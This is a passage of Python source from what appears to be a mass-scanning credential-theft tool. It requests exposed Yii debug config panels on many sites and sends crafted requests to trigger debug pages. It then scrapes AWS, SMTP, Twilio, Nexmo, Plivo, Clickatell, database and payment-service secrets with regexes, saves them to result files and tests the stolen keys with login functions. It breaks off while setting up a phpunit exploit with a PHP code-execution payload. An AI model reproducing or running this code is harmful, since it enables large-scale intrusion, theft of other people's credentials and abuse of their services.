				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}SMSTO Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(VIP)SMS.TO.txt', 'a')
				save.write(remover+'\n')
				save.close()


			elif "COINPAYMENTS" in text or "coinpayments" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)coinpayments.txt', 'a')
				save.write(remover+'\n')
				save.close()

			elif "BLOCKCHAIN" in text or "blockchain" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)blockchain.txt', 'a')
				save.write(remover+'\n')
				save.close()
			elif "COINBASE" in text or "coinbase" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)coinbase.txt', 'a')
				save.write(remover+'\n')
				save.close()
			elif "PERFECTMONEY" in text or "perfectmoney" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)perfectmoney.txt', 'a')
				save.write(remover+'\n')
				save.close()
			elif "nexmo" in text or "NEXMO" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)NEXMO.txt', 'a')
				save.write(remover+'\n')
				save.close()
			elif "mailjet" in text or "MAILJET" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}MAILJET Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)MAILJET.txt', 'a')
				save.write(remover+'\n')
				save.close()
			elif "vonage" in text or "VONAGE" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)VONAGE.txt', 'a')
				save.write(remover+'\n')
				save.close()
			elif "clicksend" in text or "CLICKSEND" in text or "sms" in text or "SMS" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)CLICKSEND.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "sendgrid" in text:
				if "SG." in text or "apikey" in text:
					method = '/debug/default/view?panel=config'
					save = open('Result(Yii)/Manual/Found_sendgrid_apikey.txt', 'a')
					build_output = str(url)+str(method)
					save.write(build_output + '\n')
					save.close()
				else:
					method = '/debug/default/view?panel=config'
					save = open('Result(Yii)/Manual/Found_sendgrid_login.txt', 'a')
					build_output = str(url)+str(method)
					save.write(build_output + '\n')
					save.close()
			elif "rackspace" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)rackspace.txt', 'a')
				save.write(remover+'\n')
				save.close()
			elif "1and1" in text or "1und1" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)1and1.txt', 'a')
				save.write(remover+'\n')
				save.close()
			elif "mandrill" in text or "MANDRILL" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)mandrill.txt', 'a')
				save.write(remover+'\n')
				save.close()
			elif "rds.amazonaws.com" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AKIA Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/(DEBUG)rds.amazonaws.txt', 'a')
				save.write(remover+'\n')
				save.close()
			elif "AKIA" in text:
				method = '/debug/default/view?panel=config'
				if "://AKIA" in text or "://email-smtp" in text or "email-smtp." in text:
					save = open('Result(Yii)/Manual/AMAZON_SES_RANDOM.txt', 'a')
					build_output = str(url)+str(method)
					save.write(build_output + '\n')
					save.close()
				else:
					method = '/debug/default/view?panel=config'
					build = str(url)+str(method)
					remover = str(build).replace('\r', '')
					save = open('Result(Yii)/Manual/Found_AWSKEY.txt', 'a')
					build_output = url
					save.write(build_output + '\n')
					save.close()
			elif 'mysql://' in text:
				try:
					regex = re.findall('</td><td class="v">mysql://(.*?)</td></tr>', html)[0]
					save = open('Result(Yii)/Regex_DB.txt', 'a')
					build_output = url + ' | mysql://' + str(regex)
					save.write(build_output + '\n')
					save.close()
					var_print += ' | DATABASE'
				except:
					pass
			elif "ionos.com" in text:
				method = '/debug/default/view?panel=config'
				save = open('Result(Yii)/Manual/Mailer_IONOS.txt','a')
				build_output = str(url)+str(method)
				save.write(build_output + '\n')
				save.close()
			elif "mailgun" in text or "MAILGUN" in text:
				method = '/debug/default/view?panel=config'
				save = open('Result(Yii)/Manual/MAILGUN.txt','a')
				build_output = str(url)+str(method)
				save.write(build_output + '\n')
				save.close()
			elif "zimbra" in text or "ZIMBRA" in text:
				method = '/debug/default/view?panel=config'
				save = open('Result(Yii)/Manual/ZIMBRA.txt','a')
				build_output = str(url)+str(method)
				save.write(build_output + '\n')
				save.close()
			elif "office365.com" in text:
				method = '/debug/default/view?panel=config'
				save = open('Result(Yii)/Manual/Mailer_OFFICE365.txt','a')
				build_output = str(url)+str(method)
				save.write(build_output + '\n')
				save.close()
			elif "smtp-relay.gmail.com" in text:
				method = '/debug/default/view?panel=config'
				save = open('Result(Yii)/Manual/Mailer_RELAYGMAIL.txt','a')
				build_output = str(url)+str(method)
				save.write(build_output + '\n')
				save.close()


			else:
				return False
		except:
			return False
	def get_twillio2(self, text, url):
		try:
			if "TWILIO" in text:
				if "TWILIO" in text or "twilio" in text or 'class="v">AC' in text:
					method = '/debug/default/view?panel=config'
					print(f"{gr}# {res}{url} {red}[{gr}TWILIO Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/Found_Manual_twilio.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_sendgrid2(self, text, url):
		try:
			if "sendgrid" in text:
				if "SG." in text or "apikey" in text:
					method = '/debug/default/view?panel=config'
					print(f"{gr}# {res}{url} {red}[{gr}SENDGRID Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/Found_Manual_sendgrid.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_plivo2(self, text, url):
		try:
			if "plivo" in text or "PLIVO" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}PLIVO Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/Found_Manual_plivo.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_nexmo2(self, text, url):
		try:
			if "nexmo" in text or "NEXMO" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}NEXMO Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/Found_Manual_nexmo.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_vonage2(self, text, url):
		try:
			if "vonage" in text or "VONAGE" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}VONAGE Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/Found_Manual_vonage.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_mandrill(self, text, url):
		try:
			if "mandrillapp" in text or "mandrill" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}MANDRILL Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/Found_Manual_MANDRILL.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_mailjet(self, text, url):
		try:
			if "mailjet" in text or "MAILJET" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}MANDRILL Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/Found_Manual_MAILJET.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_zimbra(self, text, url):
		try:
			if "zimbra" in text or "ZIMBRA" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}MANDRILL Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/Found_Manual_ZIMBRA.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_clicksend2(self, text, url):
		try:
			if "clicksend" in text or "CLICKSEND" in text or "sms" in text or "SMS" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}VONAGE Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/Found_Manual_clicksend.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_smtpaws2(self, text, url):
		try:
			if "AKIA" in text:
				if "://AKIA" in text or "://email-smtp" in text:
					method = '/debug/default/view?panel=config'
					print(f"{gr}# {res}{url} {red}[{gr}AMAZON Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/AMAZON_SES.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_smtpaws3(self, text, url):
		try:
			if "AKIA" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AMAZON Found{red}]\n")


				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/AMAZON_SES_KEY.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_mailgun2(self, text, url):
		try:
			if "MAILGUN" in text or "mailgun" in text:

				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}TWILIO Found{red}]\n")

				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/Found_Manual_mailgun.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_smtpaws4(self, text, url):
		try:
			if "rds.amazonaws.com" in text:
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}AMAZON Found{red}]\n")


				build = str(url)+str(method)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/Found_Manual_AWS_RDS.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_database2(self, text, url):
		try:
			if "mysql" in text:
				regex = re.findall('</td><td class="v">mysql://(.*?)</td></tr>', text)[0]
				method = '/debug/default/view?panel=config'
				print(f"{gr}# {res}{url} {red}[{gr}DATABASE Found{red}]\n")

				build = str(url)+ '|22|' + str(regex)
				remover = str(build).replace('\r', '')
				save = open('Result(Yii)/Manual/DATABASE.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True

			else:
				return False
		except:
			return False
	def get_sms(self, text, url):
		try:
			if "PROSTO_USER" in text:
				if "PROSTO_PASS" in text:
					method = '/.env'
					try:
						acc_sid = reg('PROSTO_USER.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('PROSTO_PASS.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_key = ''

				elif 'SMS_PROSTO_USER' in text:
					method = 'debug'
					try:
						acc_sid = reg('SMS_PROSTO_USER.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = reg('SMS_PROSTO_PASS.*<td class="v">(.*?)</td></tr>', text)[0]
					except:
						acc_key = ''
				build_forchecker = str(acc_sid)+"|"+str(acc_key)
				remover2 = str(build_forchecker).replace('\r', '')
				save2 = open('Result(Yii)/Apache(SMS).txt','a')
				save2.write(remover2+'\n')
				save2.close()
				login_nexmo(url, acc_sid, acc_key)
				return True
			else:
				return False
		except:
			return False

def printf3(text):
	''.join([str(item) for item in text])
	print(text),

def legalegion3(url):
    global progres
    resp = False
    try:
        paths = apachepath
        cacat = debugpath
        for path in cacat:
            try:
                payload = url + path
                se3 = requests.session()
                text = f'{red}# {res} {fc}[{res}{url}{fc}]'
                headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
                get_source = requests.get(url+"/debug/default/view?panel=config", headers=headers, timeout=5, verify=False, allow_redirects=False).text
                if "PHP License" in get_source:
                    #prepare_phpunit(url)
                    resp = get_source
                    #appkey = re.findall("\nAPP_KEY=(.*?)\n", get_source)[0]
                else:
                    for payme in cacat:
                        get_source = requests.post(url, data={"0x01[]":"legion3"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
                        if "<td>PHP License</td>" in get_source:

                            resp = get_source
                            remover2 = str(url).replace('\r', '')
                            save3 = open('Result(Yii)/DEBUG_Vulnerable.txt','a')
                            save3.write(remover2+ payme + '\n')
                            save3.close()
                            #appkey = re.findall("<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", get_source)[0]


                if resp:
                    remover2 = str(url).replace('\r', '')
                    save3 = open('Result(Yii)/Vulnerable.txt','a')
                    save3.write(remover2+'\n')
                    save3.close()
                    rawmode = legion3().get_aws_data(resp, url)
                    manual = legion3().get_smtp(resp, url)
                    getappkey = legion3().get_smtp2(resp, url)
                    getmailgun = legion3().get_smtp3(resp, url)
                    getsmtp = legion3().get_database(resp, url)
                    getwtilio = legion3().get_twillio(resp, url)
                    smsapi = legion3().get_send2(resp, url)
                    getaws = legion3().get_nexmo(resp, url)
                    getpp = legion3().get_alllegion(resp, url)
                    getdb = legion3().get_twillio2(resp, url)
                    getdb2 = legion3().get_sendgrid2(resp, url)
                    getssh1 = legion3().get_plivo2(resp, url)
                    getwtilio2 = legion3().get_nexmo2(resp, url)
                    getdb32 = legion3().get_vonage2(resp, url)
                    getssh1 = legion3().get_mandrill(resp, url)
                    getwtilio2 = legion3().get_mailjet(resp, url)
                    getdb32 = legion3().get_zimbra(resp, url)
                    getssh1 = legion3().get_clicksend2(resp, url)
                    getwtilio2 = legion3().get_smtpaws2(resp, url)
                    getdb32 = legion3().get_smtpaws3(resp, url)
                    getssh1 = legion3().get_mailgun2(resp, url)
                    getwtilio2 = legion3().get_smtpaws4(resp, url)
                    getdb32 = legion3().get_database2(resp, url)

                else:
                    text += f" {yl} Can't get everything{res}"
                    save =open('Result(Yii)/not_vulnerable.txt', 'a')
                    save.write(url + '\n')
                    save.close()
            except Exception as err:
                text = f'{red}# {res}{url}{yl}{ilu}{fc}'
                text += f' {yl} Can\'t access sites {res}'
                save =open('Result(Yii)/not_vulnerable.txt', 'a')
                save.write(url + '\n')
                save.close()
            progres = progres + 1
            printf3(f'{fc}❍ {red}[{gr}{ntime()}{red}] {red}[{gr}{str(progres)}{red}] {text} {red}✗')
    except:
        pass

class warna():
	"""docstring for warna"""
	def red(self,str):
		return colored(str, "red")
	def blue(self,str):
		return colored(str, "blue")
	def green(self,str):
		return colored(str, "green")
	def yellow(self,str):
		return colored(str, "yellow")
class _exploit():
	"""This Class For Exploit"""
	def __init__(self):
		self.clr = warna()

	def get_twilio(self,text,url):

		try:
			if "TWILIO" in text:
				if "<td>#TWILIO_SID</td>" in text:
					text = text.replace("\n", "##")
					try:
						acc_sid = re.findall('<td>#TWILIO_SID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = re.findall('<td>#TWILIO_AUTH<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
					except:
						auhtoken = ''

					twilio = acc_sid+'|'+auhtoken
					self.save(twilio, 'Results/env/twilio_env.txt')
					legiontwilio2(acc_sid, auhtoken)

					return True


				elif "<td>#TWILIO_ACCOUNT_SID</td>" in text:
					text = text.replace("\n", "##")
					try:
						acc_sid = re.findall('<td>#TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = re.findall('<td>#TWILIO_ACCOUNT_TOKEN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
					except:
						auhtoken = ''

					twilio = acc_sid+'|'+auhtoken
					self.save(twilio, 'Results/env/twilio_env.txt')
					legiontwilio2(acc_sid, auhtoken)

					return True
				elif "<td>#TWILIO_ACCOUNT_SID</td>" in text:
					text = text.replace("\n", "##")
					try:
						acc_sid = re.findall('<td>#TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = re.findall('<td>#TWILIO_ACCOUNT_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''

					twilio = acc_sid+'|'+auhtoken
					self.save(twilio, 'Results/env/twilio_env.txt')
					legiontwilio2(acc_sid, auhtoken)

					return True


				elif '<td>TWILIO_ACCOUNT_SID</td>' in text:
					try:
						acc_sid = re.findall('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						acc_key = re.findall('<td>TWILIO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_key = ''
					try:
						sec = re.findall('<td>TWILIO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						sec = ''
					try:
						chatid = re.findall('<td>TWILIO_CHAT_SERVICE_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						chatid = ''
					try:
						phone = re.findall('<td>TWILIO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						phone = ''
					try:
						auhtoken = re.findall('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''

					twilio = acc_sid+'|'+auhtoken
					self.save(twilio, 'Results/debug/twilio_debug.txt')
					legiontwilio2(acc_sid, auhtoken)
					return True
				elif '<td>TWILIO_SID</td>' in text:
					try:
						acc_sid = re.findall('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = re.findall('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''

					twilio = acc_sid+'|'+auhtoken
					self.save(twilio, 'Results/debug/twilio_debug.txt')
					legiontwilio2(acc_sid, auhtoken)
					return True
				elif '<td>ACCOUNT_SID</td>' in text:
					try:
						acc_sid = re.findall('<td>ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						acc_sid = ''
					try:
						auhtoken = re.findall('<td>AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auhtoken = ''

					twilio = acc_sid+'|'+auhtoken
					self.save(twilio, 'Results/debug/twilio_debug.txt')
					legiontwilio2(acc_sid, auhtoken)
					return True
				else:
					return False
			else:
				return False

		except Exception as e:
			return False
			pass
	def get_plivo(self,text,url):

		try:
			if "PLIVO" in text:
				if "PLIVO_AUTH_ID=" in text:
					text = text.replace("\n", "##")
					try:
						auth_id = re.findall('PLIVO_AUTH_ID=(.*?)', text)[0]
					except:
						auth_id = ''
					try:
						auth_token = re.findall('PLIVO_AUTH_TOKEN=(.*?)', text)[0]
					except:
						auth_token = ''
					try:
						auth_number = re.findall('PLIVO_FROM_NUMBER=(.*?)', text)[0]
					except:
						auth_number = ''

					plivo = ' URL : '+str(url)+'\n PLIVO_AUTH_ID : '+auth_id+'\n PLIVO_AUTH_TOKEN : '+auth_token+'\n PLIVO_FROM_NUMBER : '+auth_number+'\n'
					self.save(plivo, 'Results/env/env_plivo.txt')

					return True

				elif '<td>PLIVO_AUTH_ID</td>' in text:

					try:
						auth_id = re.findall('<td>PLIVO_AUTH_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auth_id = ''
					try:
						auth_token = re.findall('<td>PLIVO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auth_token = ''
					try:
						auth_number = re.findall('<td>PLIVO_FROM_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						auth_number = ''

					plivo = ' URL : '+str(url)+'\n PLIVO_AUTH_ID : '+auth_id+'\n PLIVO_AUTH_TOKEN : '+auth_token+'\n PLIVO_FROM_NUMBER : '+auth_number+'\n'
					self.save(plivo, 'Results/debug/debug_plivo.txt')
					return True
				else:
					return False
			else:
				return False

		except Exception as e:
			return False
	def get_nexmo(self,text,url):

		try:
			if "NEXMO" in text:
				if "NEXMO_KEY=" in text:
					text = text.replace("\n", "##")
					try:
						n_key = re.findall('NEXMO_KEY=(.*?)', text)[0]
					except:
						n_key = ''
					try:
						n_secret = re.findall('NEXMO_SECRET=(.*?)', text)[0]
					except:
						n_secret = ''

					nexmo = ' URL : '+str(url)+'\n NEXMO_KEY : '+n_key+'\n NEXMO_SECRET : '+n_secret+'\n'
					self.save(nexmo, 'Results/env/env_nexmo.txt')
					login_nexmo(url,nexmo_key,nexmo_secret)

					return True

				elif '<td>NEXMO_KEY</td>' in text:

					try:
						auth_id = re.findall('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						n_key = ''
					try:
						n_secret = re.findall('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						n_secret = ''

					nexmo = ' URL : '+str(url)+'\n NEXMO_KEY : '+n_key+'\n NEXMO_SECRET : '+n_secret+'\n'
					self.save(nexmo, 'Results/debug/debug_nexmo.txt')
					login_nexmo(url,nexmo_key,nexmo_secret)
					return True
				elif 'NEXMO_API_KEY=' in text:

					try:
						auth_id = re.findall('NEXMO_API_KEY=(.*?)', text)[0]
					except:
						n_key = ''
					try:
						n_secret = re.findall('NEXMO_API_SECRET=(.*?)', text)[0]
					except:
						n_secret = ''

					nexmo = ' URL : '+str(url)+'\n NEXMO_KEY : '+n_key+'\n NEXMO_SECRET : '+n_secret+'\n'
					self.save(nexmo, 'Results/env/env_nexmo.txt')
					login_nexmo(url,nexmo_key,nexmo_secret)
					return True
				elif '<td>NEXMO_API_KEY</td>' in text:

					try:
						auth_id = re.findall('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						n_key = ''
					try:
						n_secret = re.findall('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						n_secret = ''

					nexmo = ' URL : '+str(url)+'\n NEXMO_KEY : '+n_key+'\n NEXMO_SECRET : '+n_secret+'\n'
					self.save(nexmo, 'Results/debug/debug_nexmo.txt')
					login_nexmo(url,nexmo_key,nexmo_secret)
					return True
				else:
					return False
			else:
				return False

		except Exception as e:
			return False
	def get_aws_region(self, text):
		reg = False
		for region in list_region.splitlines():
			if str(region) in text:
				return region
				break
	def get_clickatell(self,text,url):

		try:
			if "CLICKATELL" in text:
				if "CLICKATELL_USER=" in text:
					text = text.replace("\n", "##")
					try:
						c_user = re.findall('CLICKATELL_USER=(.*?)', text)[0]
					except:
						c_user = ''
					try:
						c_pass = re.findall('CLICKATELL_PASS=(.*?)', text)[0]
					except:
						c_pass = ''
					try:
						c_api_id = re.findall('CLICKATELL_API_ID=(.*?)', text)[0]
					except:
						c_api_id = ''

					clicktell = ' URL : '+str(url)+'\n CLICKATELL_USER : '+c_user+'\n CLICKATELL_PASS : '+c_pass+'\n CLICKATELL_API_ID : '+c_api_id+'\n'
					self.save(clicktell, 'Results/env/env_clicktell.txt')

					return True

				elif '<td>CLICKATELL_USER</td>' in text:

					try:
						c_user = re.findall('<td>CLICKATELL_USER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						c_user = ''
					try:
						c_pass = re.findall('<td>CLICKATELL_PASS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						c_pass = ''
					try:
						c_api_id = re.findall('<td>CLICKATELL_API_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						c_api_id = ''

					clicktell = ' URL : '+str(url)+'\n CLICKATELL_USER : '+c_user+'\n CLICKATELL_PASS : '+c_pass+'\n CLICKATELL_API_ID : '+c_api_id+'\n'
					self.save(clicktell, 'Results/debug/debug_clicktell.txt')
					return True
				else:
					return False
			else:
				return False

		except Exception as e:
			return False
	def get_nexmo2(self, text, url):
		if 'NEXMO_KEY=' in text:
			key = re.findall('NEXMO_KEY=(.*?)\n', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('NEXMO_SECRET=(.*?)\n', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])

				with open('Results/env/nexmo.txt', 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")


		elif 'NEXMO_API_KEY=' in text:
			key = re.findall('NEXMO_API_KEY=(.*?)\n', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('NEXMO_API_SECRET=(.*?)\n', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open('Results/env/nexmo.txt', 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")
		elif '<td>NEXMO_KEY<\/td>' in text:
			key = re.findall('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '' or key == '******':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open('Results/debug/nexmo.txt', 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")
		elif '<td>NEXMO_API_KEY<\/td>' in text:
			key = re.findall('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '' or key == '******':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open('Results/debug/nexmo.txt', 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")
	def is_valid_ipv4_address(address):
	    try:
	        socket.inet_pton(socket.AF_INET, address)
	    except AttributeError:
	        try:
	            socket.inet_aton(address)
	        except socket.error:
	            return False
	        return address.count('.') == 3
	    except socket.error:
	        return False

	    return True

	def phpunit(self,url):

		try:
			self.getenv(url)
			with requests.Session() as session:

				session.headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36"}
				payload = "<?php echo 'cepotdotid#'.php_uname().'#'; ?>"
